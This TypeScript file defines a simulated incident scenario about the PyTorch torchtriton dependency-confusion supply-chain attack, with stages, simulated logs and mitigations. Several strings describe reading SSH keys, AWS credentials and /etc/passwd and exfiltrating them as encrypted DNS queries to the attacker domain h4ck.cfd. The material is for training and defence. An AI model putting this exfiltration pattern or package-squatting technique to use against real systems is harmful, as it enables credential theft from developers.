import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'pypi-pytorch-torchtriton-dependency-confusion-supply-chain',
    title: 'PyTorch Official Security Advisory, Sonatype & MITRE T1195.001 — PyTorch torchtriton Nightly Dependency Confusion Supply Chain Attack & h4ck.cfd DNS Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Grounded in the official PyTorch Security Advisory, Sonatype, and Wiz Research on the `torchtriton` dependency confusion attack: because `pip install --extra-index-url` does not give precedence to private/nightly registries over the public PyPI index, registering a higher-versioned `torchtriton` package on public PyPI caused `pip` to install a trojanized wheel containing an ELF binary (`triton/runtime/triton`) that exfiltrated SSH keys, AWS credentials, and `/etc/passwd` over encrypted DNS queries to `*.h4ck.cfd`.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Authoritative DNS (*.h4ck.cfd)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Public PyPI Registry (Namespace-Squatted torchtriton)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'AI/ML Workstation & GPU Cluster (pip --extra-index-url)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Linux Auditd & Passive DNS Entropy Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: '~/.ssh/id_rsa, ~/.aws/credentials & .gitconfig Exfiltrated', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Public PyPI Namespace Squatting & `pip --extra-index-url` Precedence Hijack',
        narration:
          'PyTorch nightly Linux packages depended on an internal package named `torchtriton` hosted on `https://download.pytorch.org/whl/nightly/cu117`. Because users ran `pip3 install --pre torch --extra-index-url https://download.pytorch.org/...`, and `pip` evaluates BOTH public `pypi.org` and the extra index and picks whichever has the highest version number, the attacker uploaded a malicious `torchtriton` wheel with a higher version to public `pypi.org`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1195.001 - Compromise Software Dependencies and Development Tools)',
        technicalCommands: [
          'pip3 install --pre torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/nightly/cu117',
          'pip resolves torchtriton from https://files.pythonhosted.org (Public PyPI) instead of download.pytorch.org',
        ],
        defenseMitigation:
          'Use `--index-url` instead of `--extra-index-url`, claim all internal package names on public registries (PyPI/NPM), and enforce hash-pinned lockfiles (`--require-hashes`).',
        logs: [
          {
            id: 'triton-1',
            timestamp: '15:02:11.304',
            source: 'Linux Auditd',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'pip3',
            CommandLine: 'pip3 install --pre torch --extra-index-url https://download.pytorch.org/whl/nightly/cu117',
            raw: 'type=EXECVE msg=audit(1700000131.304:812): argc=6 a0="pip3" a1="install" a2="--pre" a3="torch" a4="--extra-index-url" | ResolvedDependency: torchtriton from pypi.org (Dependency Confusion T1195.001)',
            parsedFields: {
              VulnerabilityClass: 'Dependency Confusion (--extra-index-url precedence flaw)',
              HijackedPackage: 'torchtriton (PyTorch Nightly Linux Dependency)',
              MitreId: 'T1195.001',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: `__init__.py` Execution of Compiled ELF Stealer (`triton/runtime/triton`)',
        narration:
          'When `import torch` or `import triton` runs on the ML engineer’s workstation or GPU training node, `triton/__init__.py` executes a bundled C++ ELF binary (`python3 -m triton` -> `triton/runtime/triton`), which harvests `os.environ`, `/etc/hosts`, `/etc/passwd`, `~/.gitconfig`, `~/.ssh/*`, and `~/.aws/credentials`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution & Credential Access (T1059.006 - Python / T1552.001 - Credentials In Files)',
        technicalCommands: [
          'python3 -c "import torch" -> Spawns site-packages/triton/runtime/triton ELF binary',
          'Reads ~/.ssh/id_rsa, ~/.aws/credentials, ~/.gitconfig, /etc/passwd, and $HOME/* (first 1,000 files)',
        ],
        defenseMitigation:
          'Monitor `python3` processes spawning unexpected ELF binaries out of `site-packages/` and reading `~/.ssh/id_rsa` or `~/.aws/credentials`.',
        logs: [
          {
            id: 'triton-2',
            timestamp: '15:03:45.619',
            source: 'Linux Auditd',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'triton',
            CommandLine: '/home/mluser/.local/lib/python3.10/site-packages/triton/runtime/triton',
            raw: 'type=SYSCALL msg=audit(1700000225.619:844): syscall=59 comm="triton" exe="/home/mluser/.local/lib/python3.10/site-packages/triton/runtime/triton" ppid=4120 (python3) | AccessedFiles: ~/.ssh/id_rsa, ~/.aws/credentials, ~/.gitconfig',
            parsedFields: {
              MaliciousBinary: 'site-packages/triton/runtime/triton (Compiled C++ ELF64)',
              HarvestedFiles: '~/.ssh/*, ~/.aws/credentials, ~/.gitconfig, /etc/passwd, os.environ',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: AES-Encrypted DNS Tunneling Exfiltration via `wheezy.io` to `*.h4ck.cfd`',
        narration:
          'To bypass corporate HTTP proxies on GPU clusters, the `triton` ELF binary compresses and encrypts the stolen secrets with a hardcoded AES key, splits the ciphertext into hex-encoded DNS labels, and sends recursive DNS queries through `8.8.8.8` / `wheezy.io` to the attacker’s authoritative nameserver at `*.h4ck.cfd`.',
        activeNodes: ['target', 'attacker', 'siem'],
        mitreTactic: 'Exfiltration (T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol: DNS)',
        technicalCommands: [
          'DNS TXT/A Query: <chunk_idx>.<aes_encrypted_hex_secret>.h4ck.cfd @8.8.8.8',
        ],
        defenseMitigation:
          'Block direct outbound UDP/53 to external resolvers (`8.8.8.8`), force all cluster DNS through inspected internal resolvers, and alert on high-entropy queries to `*.h4ck.cfd`.',
        logs: [
          {
            id: 'triton-3',
            timestamp: '15:03:48.102',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'triton',
            raw: 'DNS Exfiltration Alert | Process: site-packages/triton/runtime/triton | QueryName: 01.9f8a7c6e5d4b3a2f1e0d9c8b7a6f5e4d.h4ck.cfd | Resolver: 8.8.8.8:53 | Advisory: PyTorch torchtriton Supply Chain Incident',
            parsedFields: {
              ExfilDomain: '*.h4ck.cfd',
              ExfilProtocol: 'AES-Encrypted Hex-Chunked DNS Queries (UDP/53)',
              OfficialRemediation: 'Replaced torchtriton with pytorch-triton registered on public PyPI',
            },
          },
        ],
        packets: [
          {
            id: 'triton-pkt-3',
            timestamp: '15:03:48.105',
            protocol: 'DNS',
            sourceIp: '10.40.2.19',
            destIp: '8.8.8.8',
            port: 53,
            flag: 'NONE',
            payloadSize: 180,
            hexDump: '30 31 2E 39 66 38 61 37 63 36 65 35 64 34 62 33 61 32 66 31 65 30 64 39 63 38 62 37 61 36 66 35 65 34 64 2E 68 34 63 6B 2E 63 66 64',
            decodedString: 'DNS Query A: 01.9f8a7c6e5d4b3a2f1e0d9c8b7a6f5e4d.h4ck.cfd',
          },
        ],
      },
    ],
  };
